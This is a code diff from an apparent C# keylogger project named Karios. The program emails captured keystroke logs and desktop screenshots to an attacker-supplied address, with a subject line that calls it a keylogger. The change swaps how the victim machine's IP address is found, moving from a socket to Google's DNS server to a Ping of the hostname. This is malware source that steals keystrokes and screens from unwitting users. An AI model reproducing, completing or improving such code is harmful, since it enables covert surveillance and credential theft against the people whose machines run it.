@@ -16,6 +16,7 @@ using System.Drawing.Imaging;
 using System.Drawing;
 using System.Runtime.Remoting.Messaging;
 using System.Net.Mime;
+using System.Net.NetworkInformation;
 
 namespace Karios
 {
@@ -33,6 +34,7 @@ namespace Karios
         public static string _emailEndpoint;
         public static string picAttachment;
         public static Bitmap memoryImage;
+        public static string _keyOnline;
 
         public static void Main()
         {
@@ -197,6 +199,7 @@ namespace Karios
 
                     _emailEndpoint = preppedCommand[4];
                     _website = preppedCommand[8];
+
                     loop = false;
                 }
             }
@@ -251,7 +254,7 @@ namespace Karios
                 mail.From = new MailAddress("GINGIRULES@gmail.com");
                 mail.To.Add(_emailEndpoint);
                 mail.Subject = "log from keylogger on" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-                mail.Body = "New log file from Computer (" + GetLocalIp(_localIp) + " , finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
+                mail.Body = "New log file from Computer (" + GetIPAddress(Dns.GetHostName()) + " , finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
                 var attachment = new Attachment(pathToLog);
                 mail.Attachments.Add(attachment);
                 CaptureDesktop();
@@ -330,15 +333,16 @@ namespace Karios
             */
         }
 
-
-        public static string GetLocalIp(string localIp)
+        public static IPAddress GetIPAddress(string hostName)
         {
-            using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
+            Ping ping = new Ping();
+            var replay = ping.Send(hostName);
+
+            if (replay.Status == IPStatus.Success)
             {
-                socket.Connect("8.8.8.8", 65530);
-                if (socket.LocalEndPoint is IPEndPoint endPoint) localIp = endPoint.Address.ToString();
-                return localIp;
+                return replay.Address;
             }
+            return null;
         }
 
         public static void LaunchWebsite()
